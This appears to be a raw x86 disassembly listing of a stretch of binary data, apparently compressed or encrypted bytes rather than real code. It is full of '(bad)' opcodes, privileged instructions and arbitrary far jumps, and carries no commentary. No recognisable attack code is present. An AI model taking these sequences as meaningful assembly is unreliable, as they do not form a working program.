  422bdf:	adc    bh,BYTE PTR [esi+0x1a633699]
  422be5:	daa    
  422be6:	and    DWORD PTR [edx+0x1771f257],esi
  422bec:	cmp    ebx,DWORD PTR [edi+0x2649597e]
  422bf2:	std    
  422bf3:	aaa    
  422bf4:	aad    0x26
  422bf6:	push   ecx
  422bf7:	mov    ebx,0x9e0ca185
  422bfc:	push   ebx
  422bfd:	es in  al,0xac
  422c00:	push   es
  422c01:	xlat   BYTE PTR ds:[ebx]
  422c02:	jnp    0x422c1e
  422c04:	int    0xfc
  422c06:	scas   al,BYTE PTR es:[edi]
  422c07:	ins    BYTE PTR es:[edi],dx
  422c08:	ret    
  422c09:	or     dl,BYTE PTR cs:[ebx-0x50]
  422c0d:	das    
  422c0e:	cdq    
  422c0f:	(bad)  
  422c10:	hlt    
  422c11:	pop    ds
  422c12:	and    DWORD PTR [esi-0x7bbfa3a6],ecx
  422c18:	popa   
  422c19:	aas    
  422c1a:	cwde   
  422c1b:	std    
  422c1c:	inc    esp
  422c1d:	mov    al,es:0x184fbd69
  422c23:	adc    eax,0xcc44d71e
  422c28:	add    eax,0xa07840d9
  422c2d:	cwde   
  422c2e:	pop    esp
  422c2f:	push   0xfd91f25b
  422c34:	mov    dl,BYTE PTR [edx+esi*2-0x41051d96]
  422c3b:	clc    
  422c3c:	inc    eax
  422c3d:	mov    ds:0x1679ff6d,eax
  422c42:	pusha  
  422c43:	pop    ss
  422c44:	imul   edx,DWORD PTR [edx-0x54239dc0],0x6
  422c4b:	cmc    
  422c4c:	add    al,0x7e
  422c4e:	sub    esi,DWORD PTR [ebx-0x47]
  422c51:	dec    ecx
  422c52:	je     0x422bd7
  422c54:	push   ss
  422c55:	sbb    ebx,DWORD PTR [ecx+ebx*8-0x237d853]
  422c5c:	shl    DWORD PTR [ecx],cl
  422c5e:	jmp    0x5f604a4e
  422c63:	or     esi,DWORD PTR [ecx+eiz*2-0x65713a3e]
  422c6a:	(bad)  
  422c6b:	repz xor eax,0x3a3b6eb0
  422c71:	mov    ah,0xfc
  422c73:	inc    edx
  422c74:	mov    cl,0x42
  422c76:	bound  edx,QWORD PTR [edi]
  422c78:	push   ebx
  422c79:	in     al,dx
  422c7a:	nop
  422c7b:	or     al,0x9
  422c7d:	mov    dl,0xea
  422c7f:	pop    es
  422c80:	inc    esp
  422c81:	xor    eax,0xc5651c58
  422c86:	dec    edi
  422c87:	test   BYTE PTR [ebp+0x6fec0d1d],bl
  422c8d:	push   ds
  422c8e:	dec    esi
  422c8f:	pop    ds
  422c90:	jg     0x422ccb
  422c92:	xchg   esi,eax
  422c93:	sahf   
  422c94:	popa   
  422c95:	out    dx,eax
  422c96:	ror    DWORD PTR [edx+eax*8+0x54],cl
	...
  422d12:	add    BYTE PTR [eax],al
  422d14:	mov    ?,WORD PTR [ebp-0x1b]
  422d17:	in     al,dx
  422d18:	idiv   esp
  422d1a:	(bad)  
  422d1b:	jg     0x422d8f
  422d1d:	and    eax,0x29eb1474
  422d22:	sti    
  422d23:	leave  
  422d24:	addr16 ret 
  422d26:	add    DWORD PTR [eax],eax
  422d28:	outs   dx,BYTE PTR ds:[esi]
  422d29:	pop    es
  422d2a:	add    BYTE PTR [eax],al
  422d2c:	ficom  DWORD PTR [ebx-0x1468a6d8]
  422d32:	test   eax,0xa237eb95
  422d37:	mov    esp,DWORD PTR [esi]
  422d39:	repnz (bad) 
  422d3b:	not    DWORD PTR [ebx]
  422d3d:	mov    bh,0xb3
  422d3f:	repz stc 
  422d41:	mov    ebp,0x250a7292
  422d46:	test   eax,ebp
  422d48:	xchg   bx,ax
  422d4a:	and    DWORD PTR [ecx-0x58],0x79
  422d4e:	xchg   DWORD PTR [ebp-0x32cc9e3],ebp
  422d54:	jae    0x422d0d
  422d56:	push   ebx
  422d57:	ja     0x422ce0
  422d59:	xchg   edi,eax
  422d5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d5b:	xlat   BYTE PTR ds:[ebx]
  422d5c:	cmp    edx,edi
  422d5e:	frstor [edi+ebx*1-0x7f]
  422d62:	scas   al,BYTE PTR es:[edi]
  422d63:	fist   DWORD PTR [ebx-0x22b6d4e4]
  422d69:	cmp    cl,BYTE PTR [eax+eax*8]
  422d6c:	scas   al,BYTE PTR es:[edi]
  422d6d:	adc    eax,0x3653b9d4
  422d72:	loopne 0x422de1
  422d74:	mov    al,0xdb
  422d76:	lock retf 
  422d78:	inc    eax
  422d79:	pop    edi
  422d7a:	xor    edi,ecx
  422d7c:	jno    0x422dea
  422d7e:	loope  0x422d4b
  422d80:	sub    al,0xfb
  422d82:	repz aam 0x9
  422d85:	cs das 
  422d87:	pop    ebp
  422d88:	push   edx
  422d89:	dec    eax
  422d8a:	xchg   esp,eax
  422d8b:	cmp    ch,BYTE PTR [ebx+edi*2+0x39]
  422d8f:	pop    ebx
  422d90:	push   0x1d
  422d92:	call   DWORD PTR [esp+edx*2-0x17eabc9f]
  422d99:	mov    ch,0x88
  422d9b:	xchg   ebp,eax
  422d9c:	mov    WORD PTR [ebx],gs
  422d9e:	inc    edi
  422d9f:	lahf   
  422da0:	sbb    bl,BYTE PTR [ebp-0x16]
  422da3:	fcmove st,st(4)
  422da5:	xor    esi,esp
  422da7:	mov    ds:0x6cf59b3c,eax
  422dac:	mov    ah,0x78
  422dae:	icebp  
  422daf:	leave  
  422db0:	lods   eax,DWORD PTR ds:[esi]
  422db1:	js     0x422dfa
  422db3:	rcr    DWORD PTR [ebp+0x473d9e06],1
  422db9:	inc    ebx
  422dba:	dec    ecx
  422dbb:	popf   
  422dbc:	mov    esp,eax
  422dbe:	inc    ecx
  422dbf:	pushf  
  422dc0:	mov    eax,ds:0xd5488018
  422dc5:	xchg   esi,eax
  422dc6:	mov    DWORD PTR [ecx+ebp*8+0x3c],ecx
  422dca:	sbb    DWORD PTR [ebx+0x117919d1],0xadcc8a61
  422dd4:	pop    edx
  422dd5:	push   edi
  422dd6:	lahf   
  422dd7:	mov    dh,0xfd
  422dd9:	int3   
  422dda:	jmp    0x21d1c580
  422ddf:	add    eax,0x52171d96
  422de4:	neg    BYTE PTR cs:[ebx+0x72]
  422de8:	outs   dx,BYTE PTR ds:[esi]
  422de9:	(bad)  
  422dea:	ficomp DWORD PTR [eax+eax*4-0x40b19155]
  422df1:	sub    eax,0x4a6f62cb
  422df6:	push   ebx
  422df7:	mov    ch,0xdf
  422df9:	stc    
  422dfa:	nop
  422dfb:	mov    ah,0xe9
  422dfd:	repz in eax,dx
  422dff:	cmp    ch,dh
  422e01:	sar    dh,cl
  422e03:	add    bl,BYTE PTR [ebp-0xca070db]
  422e09:	sbb    ebp,DWORD PTR [ecx-0x386b6b64]
  422e0f:	or     DWORD PTR es:[edi],ecx
  422e12:	repz sbb ch,BYTE PTR [esi+ecx*8+0x75]
  422e17:	dec    eax
  422e18:	or     ebx,ecx
  422e1a:	(bad)  
  422e1b:	imul   ebx,DWORD PTR [edx+0x567ced83],0x1a
  422e22:	xchg   edx,eax
  422e23:	jmp    0xd212:0x9b58baf4
  422e2a:	inc    edx
  422e2b:	and    DWORD PTR [ecx+0x5b],0xc6fdfeb5
  422e32:	inc    ebx
  422e33:	ret    
  422e34:	into   
  422e35:	adc    eax,0x281769c9
  422e3a:	and    eax,0xf6f7baa0
  422e3f:	int    0x59
  422e41:	addr16 inc eax
  422e43:	fistp  QWORD PTR [esi+ecx*2]
  422e46:	adc    ebp,DWORD PTR [esi+0x68db9f50]
  422e4c:	and    BYTE PTR [ebx],ah
  422e4e:	lods   al,BYTE PTR ds:[esi]
  422e4f:	ins    DWORD PTR es:[edi],dx
  422e50:	push   cs
  422e51:	je     0x422ea0
  422e53:	pop    ecx
  422e54:	addr16 push ebx
  422e56:	jno    0x422dde
  422e58:	loop   0x422e52
  422e5a:	aad    0x1f
  422e5c:	and    DWORD PTR [edi-0x7a],esi
  422e5f:	dec    edx
  422e60:	jge    0x422dfa
  422e62:	inc    esp
  422e63:	fsubr  st(2),st
  422e65:	push   0x9955deea
  422e6a:	cwde   
  422e6b:	dec    eax
  422e6c:	add    esp,DWORD PTR [esi-0x20e7e084]
  422e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e73:	and    dl,BYTE PTR [esi+0x7a]
  422e76:	retf   
  422e77:	jg     0x422ed1
  422e79:	clc    
  422e7a:	xchg   BYTE PTR [esi-0xd3ff3d5],bh
  422e80:	call   0xf570:0x4c1760c3
  422e87:	jns    0x422eb7
  422e89:	dec    edx
  422e8a:	leave  
  422e8b:	sbb    al,0xc7
  422e8d:	or     dh,BYTE PTR [esi-0x66]
  422e90:	inc    esp
  422e91:	push   0xe7c6c455
  422e96:	mov    dl,0x60
  422e98:	push   ds
  422e99:	xchg   edx,eax
  422e9a:	fs push eax
  422e9c:	sbb    dh,cl
  422e9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e9f:	mov    cl,0xd7
  422ea1:	test   al,0x1f
  422ea3:	pop    ebp
  422ea4:	das    
  422ea5:	inc    esi
  422ea6:	ds mov edx,0xf5b9b1dc
  422eac:	or     BYTE PTR [edi],dh
  422eae:	sub    eax,0x87db4a97
  422eb3:	mov    eax,ds:0x7ea5f7f7
  422eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb9:	les    eax,FWORD PTR [eax+esi*8+0x68]
  422ebd:	adc    DWORD PTR [eax-0x515885a],eax
  422ec3:	ja     0x422ebf
  422ec5:	rol    DWORD PTR [eax],cl
  422ec7:	sbb    ecx,ebp
  422ec9:	xchg   ebx,esi
  422ecb:	imul   eax,edx,0x49efd2e4
  422ed1:	jb     0x422ef6
  422ed3:	inc    esi
  422ed4:	adc    eax,0xce09327
  422ed9:	cmp    DWORD PTR [ebx+ebx*4+0x5d],ebx
  422edd:	(bad)  
  422ede:	sbb    DWORD PTR [ecx],edx
  422ee0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ee1:	sub    dl,bh
  422ee3:	sub    ecx,DWORD PTR [ebx+ebp*8]
  422ee6:	pop    eax
  422ee7:	popf   
  422ee8:	outs   dx,DWORD PTR ds:[esi]
  422ee9:	lods   eax,DWORD PTR ds:[esi]
  422eea:	mov    eax,0x1724c5ff
  422eef:	leave  
  422ef0:	repz jmp 0xb40c:0x545de945
  422ef8:	jp     0x422eb3
  422efa:	mov    esi,0x9d2b5bc1
  422eff:	ret    
  422f00:	add    eax,0x18ede4e5
  422f05:	xchg   esi,eax
  422f06:	push   edx
  422f07:	xchg   BYTE PTR [ebx],dh
  422f09:	out    dx,al
  422f0a:	adc    ebx,0x2ca8aea9
  422f10:	shr    esi,0x92
  422f13:	in     eax,dx
  422f14:	jne    0x422ef8
  422f16:	rcr    DWORD PTR [edi+eax*2],1
  422f19:	xor    BYTE PTR [edi-0x2a88ab4c],al
  422f1f:	dec    edx
  422f20:	xlat   BYTE PTR ds:[ebx]
  422f21:	fsubr  QWORD PTR [ecx+ebp*2+0x5b]
  422f25:	in     al,dx
  422f26:	test   DWORD PTR [edi],edi
  422f28:	imul   esi,DWORD PTR [ebx+0x2d],0x8888e0ec
  422f2f:	pop    ebx
  422f30:	cwde   
  422f31:	push   esi
  422f32:	add    BYTE PTR [esi-0x8fe3973],bl
  422f38:	and    al,0x42
  422f3a:	xlat   BYTE PTR ds:[ebx]
  422f3b:	dec    esp
  422f3c:	adc    ah,bh
  422f3e:	sub    dh,BYTE PTR [edx-0x62]
  422f41:	pop    esi
  422f42:	sbb    ch,BYTE PTR [edi]
  422f44:	rol    DWORD PTR [ecx+0x77],cl
  422f47:	ss dec edi
  422f49:	rol    cl,0x10
  422f4c:	jbe    0x422f5a
  422f4e:	sbb    ecx,DWORD PTR [ecx]
  422f50:	pusha  
  422f51:	fist   WORD PTR [eax+eax*4]
  422f54:	ficomp DWORD PTR [eax]
  422f56:	ret    0x7209
  422f59:	xchg   esi,eax
  422f5a:	xchg   esp,eax
  422f5b:	pop    ebp
  422f5c:	les    eax,FWORD PTR [esi-0x3ff3ba93]
  422f62:	mov    bh,BYTE PTR [ecx-0x2892a03a]
  422f68:	xor    DWORD PTR [edi],esi
  422f6a:	cmp    al,0xf2
  422f6c:	pop    ebp
  422f6d:	pop    ss
  422f6e:	sbb    BYTE PTR [edx-0x16e66f45],dl
  422f74:	inc    esp
  422f75:	jl     0x422f10
  422f77:	push   ebp
  422f78:	dec    ebp
  422f79:	mov    ebp,0xf460716b
  422f7e:	push   ecx
  422f7f:	mov    ch,0x9f
  422f81:	jmp    0xff5c:0x65f870f0
  422f88:	rcr    edi,cl
  422f8a:	mov    ds:0x4dfa70b6,al
  422f8f:	(bad)
  422f93:	(bad)  
  422f94:	mov    ds:0xfdf24219,eax
  422f99:	daa    
  422f9a:	enter  0xfc8f,0xda
  422f9e:	(bad)  
  422fa0:	les    edx,FWORD PTR [ecx+edi*1+0x597c4f28]
  422fa7:	sub    al,0x28
  422fa9:	test   bl,bh
  422fab:	pop    es
  422fac:	pusha  
  422fad:	mov    dl,0x8d
  422faf:	push   edx
  422fb0:	or     al,0x7b
  422fb2:	int3   
  422fb3:	xor    ah,BYTE PTR [edi-0x20]
  422fb6:	in     al,dx
  422fb7:	mov    ah,0x94
  422fb9:	jecxz  0x422fee
  422fbb:	sub    eax,0x54c03586
  422fc0:	push   ss
  422fc1:	in     eax,dx
  422fc2:	add    al,0xe4
  422fc4:	push   ebx
  422fc5:	jecxz  0x422f62
  422fc7:	jbe    0x422fb2
  422fc9:	ret    
  422fca:	sub    al,0x81
  422fcc:	pop    ax
  422fce:	dec    eax
  422fcf:	xor    al,0xfb
  422fd1:	xchg   ecx,eax
  422fd2:	jecxz  0x42302f
  422fd4:	clc    
  422fd5:	sbb    eax,0xf6989c8a
  422fda:	dec    ebp
  422fdb:	ret    
  422fdc:	push   ebp
  422fdd:	pop    edi
  422fde:	cdq    
  422fdf:	and    DWORD PTR ds:[eax+eax*8+0x78faf47e],edx
  422fe7:	mov    al,ds:0xb0515f67
  422fec:	or     DWORD PTR [eax-0x7a],eax
  422fef:	imul   ecx,DWORD PTR [ebp-0x3b831bbf],0x27
  422ff6:	dec    ecx
  422ff7:	stos   BYTE PTR es:[edi],al
  422ff8:	adc    dl,BYTE PTR [eax-0x2daa409e]
  422ffe:	xchg   esp,eax
  422fff:	shl    ebp,1
  423001:	pop    esp
  423002:	fsubr  DWORD PTR [ebp-0x3558d3b1]
  423008:	mov    bl,0x15
  42300a:	jns    0x423076
  42300c:	mov    cl,0x67
  42300e:	jl     0x422f96
  423010:	loopne 0x423073
  423012:	das    
  423013:	sbb    eax,0xa9c72cda
  423018:	hlt    
  423019:	add    al,0x9a
  42301b:	out    0x42,eax
  42301d:	add    esp,ecx
  42301f:	pop    eax
  423020:	xlat   BYTE PTR ds:[ebx]
  423021:	cwde   
  423022:	add    bh,BYTE PTR [ebp+0x6ffe2197]
  423028:	out    dx,eax
  423029:	xor    DWORD PTR [edx-0x5e8e5a9c],0xc6aa1c4e
  423033:	rcr    DWORD PTR [eax+0x545a10f3],cl
  423039:	pop    ss
  42303a:	add    al,0x5a
  42303c:	mov    DWORD PTR [edx+0x27cb5541],esi
  423042:	rol    BYTE PTR [edx-0x32cc12a2],0xcc
  423049:	(bad)  
  42304a:	aaa    
  42304b:	rol    DWORD PTR [ebx],cl
  42304d:	pushf  
  42304e:	jns    0x423098
  423050:	aas    
  423051:	sbb    al,0xc5
  423053:	xchg   esi,eax
  423054:	mov    edi,0xb014586b
  423059:	int3   
  42305a:	aad    0xd8
  42305c:	jp     0x4230a7
  42305e:	loop   0x4230c8
  423060:	mov    ah,0x89
  423062:	arpl   WORD PTR fs:[esi+ecx*8+0x69ba11e7],ax
  42306a:	mov    eax,ds:0x36bb4ef5
  42306f:	ins    BYTE PTR es:[edi],dx
  423070:	mov    WORD PTR [ecx-0x879ce38],cs
  423076:	mov    esp,0xdf8ea97c
  42307b:	mov    al,ds:0xd5c479ea
  423080:	loopne 0x42306b
  423082:	mov    ebp,0xcf950335
  423087:	ja     0x42308d
  423089:	test   BYTE PTR [edi+0x7caf0185],bh
  42308f:	dec    esp
  423090:	inc    ebp
  423091:	jle    0x423069
  423093:	ins    DWORD PTR es:[edi],dx
  423094:	push   edi
  423095:	jmp    0x4230a0
  423097:	mov    esp,0x568fd25c
  42309c:	mov    ds:0x30bd2306,al
  4230a1:	retf   
  4230a2:	int    0x3
  4230a4:	mov    al,0x3
  4230a6:	outs   dx,BYTE PTR ds:[esi]
  4230a7:	inc    edi
  4230a8:	cwde   
  4230a9:	push   eax
  4230aa:	sbb    al,0x83
  4230ac:	jne    0x4230fb
  4230ae:	pop    eax
  4230af:	out    0x4e,eax
  4230b1:	dec    eax
  4230b2:	xchg   ebx,esp
  4230b4:	popa   
  4230b5:	shr    edx,1
  4230b7:	xor    eax,0xf608301f
  4230bc:	rol    DWORD PTR [ebx],0x27
  4230bf:	mov    eax,ds:0xe0e675dc
  4230c4:	push   0xefaf0bc9
  4230c9:	add    eax,0xdb2c0a96
  4230ce:	jmp    0x423148
  4230d0:	xor    ebx,DWORD PTR [ecx-0x6ea9eee]
  4230d6:	idiv   eax
  4230d8:	es pop esp
  4230da:	mul    DWORD PTR [edx-0x76344007]
  4230e0:	stc    
  4230e1:	scas   al,BYTE PTR es:[edi]
  4230e2:	push   eax
  4230e3:	add    cl,BYTE PTR [eax]
  4230e5:	jmp    0x423150
  4230e7:	outs   dx,DWORD PTR ds:[esi]
  4230e8:	xchg   edi,eax
  4230e9:	inc    edi
  4230ea:	cs xchg edx,eax
  4230ec:	push   0x31c5bd65
  4230f1:	add    ch,BYTE PTR [ecx-0x78ce0f33]
  4230f7:	jo     0x42308e
  4230f9:	xor    esp,eax
  4230fb:	mov    eax,ds:0x4566f12f
  423100:	mov    DWORD PTR [esp+edx*4],0x5f658527
  423107:	jmp    0x4230b1
  423109:	xchg   esp,eax
  42310a:	dec    edi
  42310b:	jns    0x423127
  42310d:	sahf   
  42310e:	or     BYTE PTR [ebx-0x79956b49],0xd
  423115:	add    DWORD PTR [ebx-0x307fccb4],eax
  42311b:	out    0xda,eax
  42311d:	ror    BYTE PTR [ebp-0x28],1
  423120:	popa   
  423121:	outs   dx,DWORD PTR ds:[esi]
  423122:	inc    eax
  423123:	mov    ah,BYTE PTR [ecx]
  423125:	jno    0x4230e9
  423127:	imul   esi,DWORD PTR [ebp+0x2973a78b],0x449621a
  423131:	cmp    bl,BYTE PTR [edi-0x16]
  423134:	sbb    DWORD PTR [eax],ebp
  423136:	fcom   st(6)
  423138:	fs dec edi
  42313a:	test   DWORD PTR [ebx-0x38e7d9d0],ecx
  423140:	pop    eax
  423141:	jle    0x423155
  423143:	pop    es
  423144:	cmp    al,0x60
  423146:	pop    edi
  423147:	(bad)  
  423148:	push   edx
  423149:	leave  
  42314a:	xchg   esp,eax
  42314b:	xchg   BYTE PTR [edi-0x23],bh
  42314e:	mov    BYTE PTR [ebx+0x26],ch
  423151:	ret    
  423152:	outs   dx,BYTE PTR ds:[esi]
  423153:	mov    esp,0x367ae9a9
  423158:	mov    ?,WORD PTR [ebp+0x74]
  42315b:	jmp    0xa21f:0xc3e276a9
  423162:	inc    ecx
  423163:	adc    al,0x3
  423165:	add    eax,0xcd64cb7e
  42316a:	cli    
  42316b:	sbb    al,BYTE PTR [edx+eiz*1]
  42316e:	and    al,0x6c
  423170:	sbb    bh,BYTE PTR [ecx]
  423172:	sti    
  423173:	mov    dh,dl
  423175:	xor    BYTE PTR ds:0x11afd865,0x16
  42317c:	mov    esp,0x41f4ceb5
  423181:	inc    ebx
  423182:	xor    DWORD PTR [esi],edi
  423184:	fist   WORD PTR [ebx+ebx*1+0xf6ee388]
  42318b:	dec    edx
  42318c:	push   cs
  42318d:	into   
  42318e:	inc    edx
  42318f:	ins    BYTE PTR es:[edi],dx
  423190:	pcmpeqd mm1,QWORD PTR [ebx]
  423193:	push   0x43
  423195:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423196:	sti    
  423197:	xor    ecx,ebp
  423199:	test   DWORD PTR [esi+edi*8-0x18],0x6d7f0108
  4231a1:	jle    0x423135
  4231a3:	pop    ds
  4231a4:	scas   eax,DWORD PTR es:[edi]
  4231a5:	inc    edi
  4231a6:	(bad)  
  4231a7:	cwde   
  4231a8:	mov    dl,0x78
  4231aa:	adc    al,0x3c
  4231ac:	(bad)  
  4231ad:	sbb    ebp,DWORD PTR [ecx]
  4231af:	pop    esp
  4231b0:	mov    ebx,0xd0db6333
  4231b5:	push   esi
  4231b6:	popf   
  4231b7:	inc    ebx
  4231b8:	gs dec edx
  4231ba:	mov    ebp,0x10c25ed0
  4231bf:	(bad)  
  4231c1:	mov    eax,0x59a15806
  4231c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231c7:	repnz addr16 cmp ebx,ecx
  4231cb:	popf   
  4231cc:	pop    eax
  4231cd:	test   BYTE PTR [ebp+0x1d],bh
  4231d0:	jge    0x42317a
  4231d2:	mov    edi,0xb8f5ab94
  4231d7:	xor    ch,cl
  4231d9:	imul   ebp,DWORD PTR [ebx+0x3911d47f],0xffffffc9
  4231e0:	shl    DWORD PTR ss:[ebx+0x4f],0x30
  4231e5:	data16 jl 0x423250
  4231e8:	les    eax,FWORD PTR [ebp+0x33]
  4231eb:	sbb    al,ch
  4231ed:	pop    ss
  4231ee:	shl    dh,0xb8
  4231f1:	xor    al,0x97
  4231f3:	mov    al,0x3d
  4231f5:	xor    DWORD PTR [ebx-0x19],edx
  4231f8:	mov    ah,0x91
  4231fa:	(bad)  
  4231fc:	mov    esi,0xf5d74936
  423201:	std    
  423202:	loope  0x42325c
  423204:	cmp    al,0xbd
  423206:	jbe    0x42324c
  423208:	sub    eax,0x6ac9f47a
  42320d:	mov    bl,0x7b
  42320f:	xor    BYTE PTR [eax],bh
  423211:	(bad)  
  423212:	cwde   
  423213:	clc    
  423214:	cs cmp al,0xbd
  423217:	dec    esp
  423218:	adc    esi,edi
  42321a:	shl    DWORD PTR [esi],0x3c
  42321d:	xor    ah,dl
  42321f:	outs   dx,BYTE PTR ds:[esi]
  423220:	sbb    cl,0x85
  423223:	call   0xa7d1:0x177723fd
  42322a:	fsubr  QWORD PTR [esi+ebx*2-0x57]
  42322e:	mov    al,BYTE PTR [esi-0x64]
  423231:	in     eax,dx
  423232:	pop    ds
  423233:	push   ebx
  423234:	leave  
  423235:	gs inc esi
  423237:	mov    edi,DWORD PTR [esi-0x46c695d6]
  42323d:	jns    0x4231e6
  42323f:	xchg   BYTE PTR [ebp-0x29affa14],ah
  423245:	adc    DWORD PTR [edx],edx
  423247:	pop    edi
  423248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423249:	scas   eax,DWORD PTR es:[edi]
  42324a:	mov    ecx,0x48658fd4
  42324f:	sbb    dh,BYTE PTR [edi]
  423251:	rcl    DWORD PTR [ecx+0x9],cl
  423254:	aam    0xd8
  423256:	lods   al,BYTE PTR ds:[esi]
  423257:	add    al,0xec
  423259:	stos   BYTE PTR es:[edi],al
  42325a:	jae    0x423275
  42325c:	jns    0x42321f
  42325e:	retf   0xd218
  423261:	imul   ebp,DWORD PTR [ebp+0x135aa7c5],0x17
  423268:	cmc    
  423269:	pop    edi
  42326a:	mov    ds:0xac81e4b6,al
  42326f:	jl     0x42323a
  423271:	or     bh,BYTE PTR [edi]
  423273:	mov    dl,0xdb
  423275:	f2xm1  
  423277:	adc    eax,0x5b218640
  42327c:	jae    0x4232f9
  42327e:	or     al,0x60
  423280:	rcr    DWORD PTR [esi],cl
  423282:	inc    esi
  423283:	aaa    
  423284:	adc    bl,ch
  423286:	xlat   BYTE PTR ds:[ebx]
  423287:	dec    esi
  423288:	push   ecx
  423289:	pop    ss
  42328a:	inc    esi
  42328b:	and    esi,edx
  42328d:	nop
  42328e:	lea    eax,[esi+0x6023807d]
  423294:	dec    BYTE PTR [ecx+0x62]
  423297:	and    eax,0xbb8ccbbf
  42329c:	rol    DWORD PTR [eax+edx*4],0x67
  4232a0:	fwait
  4232a1:	pop    fs
  4232a3:	adc    dh,0xed
  4232a6:	sbb    BYTE PTR [ecx-0x60],ch
  4232a9:	daa    
  4232aa:	fcom   QWORD PTR [eax+0x8b77220]
  4232b0:	xor    edx,ecx
  4232b2:	popf   
  4232b3:	icebp  
  4232b4:	retf   0x5a72
  4232b7:	mov    ?,esi
  4232b9:	xor    al,0xf6
  4232bb:	jnp    0x42332f
  4232bd:	jge    0x4232fa
  4232bf:	pop    ebx
  4232c0:	or     al,0xe3
  4232c2:	test   eax,0xe87cb948
  4232c7:	xchg   edx,eax
  4232c8:	and    eax,0xf701f999
  4232cd:	hlt    
  4232ce:	lock aam 0x9
  4232d1:	mov    ds:0x9c21c7e3,al
  4232d6:	pop    es
  4232d7:	retf   0x6b1b
  4232da:	out    0xc5,eax
  4232dc:	lahf   
  4232dd:	xchg   ebp,eax
  4232de:	dec    eax
  4232df:	imul   ecx,ebx,0x798b62ec
  4232e5:	mov    ebx,0xdfdb2838
  4232ea:	cwde   
  4232eb:	push   ecx
  4232ec:	sbb    eax,0xa83ad9c7
  4232f1:	push   edx
  4232f2:	push   0xee2cbaab
  4232f7:	sbb    al,0xd8
  4232f9:	dec    ebx
  4232fa:	cli    
  4232fb:	int    0xf1
  4232fd:	jb     0x423318
  4232ff:	mov    ebx,0x3a9293eb
  423304:	fisubr WORD PTR [ecx+0x1909f331]
  42330a:	in     eax,dx
  42330b:	fs loopne 0x4232cd
  42330e:	xor    eax,0x57fb8ab6
  423313:	add    ch,BYTE PTR [eax-0x5b]
  423316:	dec    esi
  423317:	ret    
  423318:	inc    esp
  423319:	mov    DWORD PTR [esi-0x3cd11bbe],eax
  42331f:	dec    ebp
  423320:	jmp    0xd7fb99d2
  423325:	dec    edi
  423326:	mov    ah,0x24
  423328:	loop   0x4232c0
  42332a:	nop
  42332b:	or     esi,esp
  42332d:	sbb    BYTE PTR [edi+0x79],0xa5
  423331:	inc    esp
  423332:	aas    
  423333:	and    eax,DWORD PTR [eax+0x795028e3]
  423339:	cwde   
  42333a:	xchg   ecx,eax
  42333b:	add    DWORD PTR [ebp-0x5d0431db],esp
  423341:	add    DWORD PTR [ebp-0x6bc77151],0x8
  423348:	test   al,0xef
  42334a:	xchg   esp,eax
  42334b:	add    ebp,eax
  42334d:	push   ebp
  42334e:	cmp    ebp,DWORD PTR [ebx+0x22]
  423351:	hlt    
  423352:	pushf  
  423353:	add    cl,BYTE PTR ds:0x2365a39
  423359:	int3   
  42335a:	cmp    edi,DWORD PTR [eax+0x5faf6494]
  423360:	sbb    BYTE PTR [esp],ch
  423363:	push   0x29
  423365:	cli    
  423366:	adc    BYTE PTR [eax+0x2a],bl
  423369:	dec    ebp
  42336a:	or     BYTE PTR [edx+0x2d968bce],al
  423370:	dec    edi
  423371:	push   edi
  423372:	icebp  
  423373:	fdivp  st(6),st
  423375:	inc    ecx
  423376:	sub    ch,BYTE PTR [ecx]
  423378:	or     ah,al
  42337a:	pop    edx
  42337b:	retf   
  42337c:	or     DWORD PTR ds:[eax],esp
  42337f:	sbb    eax,0x97c8fa9b
  423384:	cmp    al,0x36
  423386:	daa    
  423387:	aas    
  423388:	sbb    BYTE PTR [ecx+ecx*4+0x63],0x1f
  42338d:	push   edx
  42338e:	or     edi,DWORD PTR [edx+ebp*8+0x6417129e]
  423395:	push   cs
  423396:	jmp    DWORD PTR [esi+0x29f05f9]
  42339c:	imul   edi,DWORD PTR [esi-0x32],0xee33aa38
  4233a3:	retf   
  4233a4:	add    DWORD PTR [ecx],eax
  4233a6:	out    dx,eax
  4233a7:	pop    ecx
  4233a8:	js     0x42334b
  4233aa:	pop    ebx
  4233ab:	addr16 repz aad 0xcf
  4233af:	leave  
  4233b0:	icebp  
  4233b1:	xchg   BYTE PTR [edx],dl
  4233b3:	cmp    eax,0x910fc391
  4233b8:	clc    
  4233b9:	mov    dl,0x71
  4233bb:	data16 xchg BYTE PTR [ebp-0x486cf9ac],ah
  4233c2:	shr    BYTE PTR [edx+eax*4+0x37],0x3a
  4233c7:	add    BYTE PTR [edi+eiz*8-0x9],bh
  4233cb:	retf   0x9d68
  4233ce:	mov    cl,0xa2
  4233d0:	or     al,dl
  4233d2:	stc    
  4233d3:	fmulp  st(3),st
  4233d5:	push   ss
  4233d6:	hlt    
  4233d7:	ins    DWORD PTR es:[edi],dx
  4233d8:	fisubr WORD PTR [ebx+0x2d]
  4233db:	mov    ebp,0x2c6c7462
  4233e0:	inc    esi
  4233e1:	xchg   esp,eax
  4233e2:	cmp    ah,0x93
  4233e5:	adc    eax,ecx
  4233e7:	popa   
  4233e8:	call   0x8ec63cf
  4233ed:	sbb    BYTE PTR [ebx],al
  4233ef:	clc    
  4233f0:	dec    esi
  4233f1:	xor    BYTE PTR [eax],0xd
  4233f4:	aad    0x1a
  4233f6:	push   esi
  4233f7:	or     eax,0x5451754e
  4233fc:	ins    BYTE PTR es:[edi],dx
  4233fd:	call   0x58db:0x6c576db7
  423404:	(bad)  
  423405:	fbstp  TBYTE PTR [edx]
  423407:	jg     0x423439
  423409:	dec    esi
  42340a:	jne    0x423421
  42340c:	je     0x4233aa
  42340e:	ret    
  42340f:	push   eax
  423410:	imul   edx,eax,0x34e4bb3
  423416:	push   edi
  423417:	arpl   WORD PTR [esi-0x23],ax
  42341a:	xor    DWORD PTR [esi],edi
  42341c:	outs   dx,BYTE PTR ds:[esi]
  42341d:	jo     0x4233cc
  42341f:	inc    eax
  423420:	push   edi
  423421:	mov    edi,0xb49bff7
  423426:	mov    ds:0x28842386,eax
  42342b:	mov    dh,BYTE PTR [ebx-0x5c]
  42342e:	pushf  
  42342f:	dec    BYTE PTR [edx]
